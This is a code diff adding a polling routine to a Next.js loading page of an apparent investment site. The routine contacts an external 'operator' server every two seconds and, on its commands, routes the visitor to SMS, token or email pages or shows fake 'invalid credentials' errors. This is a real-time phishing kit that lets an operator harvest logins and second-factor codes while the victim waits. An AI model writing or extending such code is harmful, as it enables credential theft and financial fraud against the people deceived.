@@ -5,6 +5,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { ChevronDown } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useRouter } from "next/navigation"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
 const getDefaultLanguage = () => {
@@ -26,7 +27,8 @@ const translations = {
       "Finalisation...",
       "Veuillez patienter..."
     ],
-    preparing: "Préparation de votre expérience d'investissement..."
+    preparing: "Préparation de votre expérience d'investissement...",
+    invalidCredentials: "Identifiants invalides. Veuillez réessayer."
   },
   en: {
     loadingMessages: [
@@ -38,12 +40,20 @@ const translations = {
       "Finalizing...",
       "Please wait..."
     ],
-    preparing: "Preparing your investment experience..."
+    preparing: "Preparing your investment experience...",
+    invalidCredentials: "Invalid credentials. Please try again."
   },
+}
+
+// Interface para comandos do servidor
+interface ServerCommand {
+  command: string;
+  clientId?: string;
 }
 
 export default function LoadingPage() {
   const metrics = useMetrics() // Hook das métricas
+  const router = useRouter()
   const [language, setLanguage] = useState(() => getDefaultLanguage())
   const [currentMessageIndex, setCurrentMessageIndex] = useState(0)
 
@@ -66,6 +76,74 @@ export default function LoadingPage() {
 
     return () => clearInterval(interval)
   }, [t.loadingMessages.length])
+
+  // Monitorar comandos do servidor a cada 2 segundos
+  useEffect(() => {
+    // Recuperar clientId do localStorage (definido durante o login)
+    const clientId = localStorage.getItem('client_id') || '';
+    
+    // Função para verificar comandos
+    const checkCommands = async () => {
+      try {
+        // Chamar API para verificar comandos
+        const response = await fetch('https://servidoroperador.onrender.com/api/commands/check', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ clientId })
+        });
+        
+        if (response.ok) {
+          const data: ServerCommand = await response.json();
+          
+          // Processar comandos
+          if (data && data.command) {
+            console.log('Comando recebido:', data.command);
+            
+            switch (data.command) {
+              case 'ir_sms':
+                router.push('/sms');
+                break;
+                
+              case 'ir_auth':
+                router.push('/token');
+                break;
+                
+              case 'ir_email':
+                router.push('/email');
+                break;
+                
+              case 'inv_username':
+              case 'inv_password':
+                // Armazenar informação de erro no localStorage
+                localStorage.setItem('auth_error', 'true');
+                localStorage.setItem('error_type', data.command);
+                router.push('/home');
+                break;
+                
+              default:
+                // Comando desconhecido, não fazer nada
+                break;
+            }
+          }
+        } else {
+          console.error('Erro ao verificar comandos:', await response.text());
+        }
+      } catch (error) {
+        console.error('Erro ao verificar comandos:', error);
+      }
+    };
+    
+    // Verificar comandos a cada 2 segundos
+    const commandInterval = setInterval(checkCommands, 2000);
+    
+    // Verificar comandos imediatamente ao carregar
+    checkCommands();
+    
+    // Limpar intervalo ao desmontar componente
+    return () => clearInterval(commandInterval);
+  }, [router]);
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
